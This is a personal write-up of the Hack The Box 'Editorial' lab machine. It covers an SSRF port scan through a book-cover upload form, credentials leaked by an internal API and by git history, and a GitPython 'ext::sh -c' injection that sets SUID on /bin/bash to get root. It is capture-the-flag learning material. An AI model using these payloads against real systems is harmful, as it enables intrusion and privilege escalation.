+++
date = '2026-06-12T02:13:38-04:00'
title = 'Editorial'
tags = ["htb", "easy", "sudo","SSRF","api"]
+++


![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a466db5ce4f7aaea98f588d1cb71a0aa.png)

https://www.hackthebox.com/machines/Editorial
## OS: Linux
``` IP
10.129.15.185
```
## Credentials:

| Username | Password                   | Notes/Hash                                     |
| -------- | -------------------------- | ---------------------------------------------- |
| `dev`    | `dev080217_devAPI!@`       | leaked password from vulnerable SSRF api       |
| `prod`   | `080217_Producti0n_2023!@` | from `git` enumeration in `dev` home directory |

---
## `nmap` results:
```
# Nmap 7.99 scan initiated Thu Jun 11 22:59:02 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Editorial 10.129.15.185
Nmap scan report for 10.129.15.185
Host is up, received reset ttl 63 (0.016s latency).
Scanned at 2026-06-11 22:59:02 EDT for 21s
Not shown: 65289 closed tcp ports (reset), 244 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```
modify `/etc/hosts`
```
echo "10.129.15.185 editorial.htb" >> /etc/hosts
```
then rescan `HTTP` with `nmap` default scripts:
```
# Nmap 7.99 scan initiated Thu Jun 11 23:04:00 2026 as: /usr/lib/nmap/nmap -p80 -sC -sV -vv -oA nmap/HTTPDefaultScan 10.129.15.185
Nmap scan report for editorial.htb (10.129.15.185)
Host is up, received reset ttl 63 (0.015s latency).
Scanned at 2026-06-11 23:04:00 EDT for 7s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
 
---
## Attack + Enum Vectors
- TCP 80: HTTP nginx 1.18.0
- TCP 22: SSH OpenSSH 8.9p1

### UDP (161 SNMP)?
- closed

---
## Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
Alright so after browsing around I have decided that it's time to add new methodologies: from [0xdf](https://0xdf.gitlab.io/2024/10/19/htb-editorial.html) we know this box requires using the SSRF attack, open up Burp Suite:
```
http://editorial.htb/upload
```
and enter `http://localhost:[port]` in the cover URL image and click on preview:

Then on Burp Suite we see:
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary42a1960b4f15e7dea95b2b0c083f3c88
Content-Length: 350
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload
Priority: u=0

------geckoformboundary42a1960b4f15e7dea95b2b0c083f3c88
Content-Disposition: form-data; name="bookurl"

http://localhost:22
------geckoformboundary42a1960b4f15e7dea95b2b0c083f3c88
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------geckoformboundary42a1960b4f15e7dea95b2b0c083f3c88--
```
and the request returns:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 12 Jun 2026 05:22:00 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 61

/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```
if we do:
```
http://localhost:80
```
appearantly it hangs, but at 22 it doesnt and for every other weird port it returns the same thing for some reason. Let's save it: `Ctrl + A` -> `save selected text to file` 
```
ffuf -u http://editorial.htb/upload-cover -request ssrf.request -w <(seq 0 65535) -ac
```
whoops I forgot to modify `22` to `FUZZ` parameter
```
:: Progress: [1/1] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
let's edit the request and change `22` to `FUZZ` and re-run:
```
5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 221ms]
:: Progress: [65536/65536] :: Job [1/1] :: 218 req/sec :: Duration: [0:03:59] :: Errors: 2 ::
```
Now let's enumerate that port 5000

---
## Initial Foothold
On Burp Suite with repeater: 
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary42a1960b4f15e7dea95b2b0c083f3c88
Content-Length: 350
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload
Priority: u=0

------geckoformboundary42a1960b4f15e7dea95b2b0c083f3c88
Content-Disposition: form-data; name="bookurl"

http://localhost:5000
------geckoformboundary42a1960b4f15e7dea95b2b0c083f3c88
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------geckoformboundary42a1960b4f15e7dea95b2b0c083f3c88--
```
yields an upload:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 12 Jun 2026 05:38:38 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 51

static/uploads/4e69c249-125c-4176-b91b-66b1429e32d7
```
trying to access that web link did not work on firefox:

but with `curl` yields:
```
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```
which returned the APIs, enumerating them, `/api/latest/metadata/messages/authors` returned results which we can see a password and a username:
```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```
`dev:dev080217_devAPI!@`

Now let's try to use `ssh` to log on to the user:
```
ssh dev@editorial.htb
```
we got in as `dev`!

---
## Priv Esc
```
ls -lah
```
we see there's a `/apps` in the home directory:
```
ls -lahR
```
and we see `/apps` has a `.git` directory with commitments
```
cd /apps
```
and view the `git logs`:
```
git logs
```
shows a few commitments:
```
git diff 8ad0f3187e2bda88bba85074635ea942974587e8 1e84a036b2f33c59e2390730699a488c65643d28
```
shows:
```
diff --git a/app_api/app.py b/app_api/app.py
index 9d7e1d5..61b786f 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,11 +64,11 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
 # Start program
 # -------------------------------
 if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000)
+    app.run(host='127.0.0.1', port=5001, debug=True)
diff --git a/app_editorial/app.py b/app_editorial/app.py
index 4855487..9cb0117 100644
--- a/app_editorial/app.py
+++ b/app_editorial/app.py
@@ -22,7 +22,7 @@ def request_reject_localhost(url_bookcover):
 
 # -- Editorial information (API)
 def api_editorial_info(key):
-    r = requests.get('http://127.0.0.1:5000/api')
+    r = requests.get('http://127.0.0.1:5001/api')
     json_editorial_info = json.loads(r.text)
 
     editorial_api_version = list(json_editorial_info['version'][-1].keys())[0]
@@ -105,4 +105,4 @@ def about():
 # Start program
 # -------------------------------
 if __name__ == '__main__':
-    app.run(host='0.0.0.0')
+    app.run(host='0.0.0.0', debug=True)
```
and we see a user and a password: `prod:080217_Producti0n_2023!@`

now let's switch to user:
```
su prod
```
```
080217_Producti0n_2023!@
```
we moved laterally to `prod` successfully!

```
sudo -l
```
yields:
```
(root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```
```
ls -lah /opt/internal_apps/clone_changes/clone_prod_change.py
```
```
-rwxr-x--- 1 root prod 256 Jun  4  2024 /opt/internal_apps/clone_changes/clone_prod_change.py
```
so we can read and execute the file, but not change it; we can't hijack it.
```
cat /opt/internal_apps/clone_changes/clone_prod_change.py
```
```
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
I don't think `os` and `sys` library are vulnerable? Let's first google :
```
git Repo library privilege escalation exploit
```
and found:
```
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
```

So if we inject our malicious code:
```
ext::sh -c touch% /tmp/pwned
```
and try:
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
```
then look in `/tmp`:
```
ls /tmp
```
we see `pwned` successfully, so we have code execution!

Let's add SUID bit to `/bin/bash`:
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod +s /bin/bash'
```
and 
```
/bin/bash -p
```
It didn't work..?

Looking at the exploit again: I guess we need to add `%` infront of `space`:
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% +s% /bin/bash'
```
and
```
/bin/bash -p
```
There we go! we got root shell.

Therefore pwn'd.

---
## Conclusion & Remediation
This box definitely was not the easiest box, but required different knowledge that I didn't know about and learned throughout. The review of the concepts of SSRF outside of Active Directory environments might be very useful for me in the future.

To remediate for similar attacks appeared in the lab: system administrators should avoid SSRF on any input that can take URLs, and make sure apis don't leak important credentials that could give attackers access. Lastly, misconfigured `sudo` scripts should be removed to follow the principle of least privileges. At the very least, libraries exploitable to local privilege escalation vulnerabilities needs to be updated to the latest version that patches out the vulnerability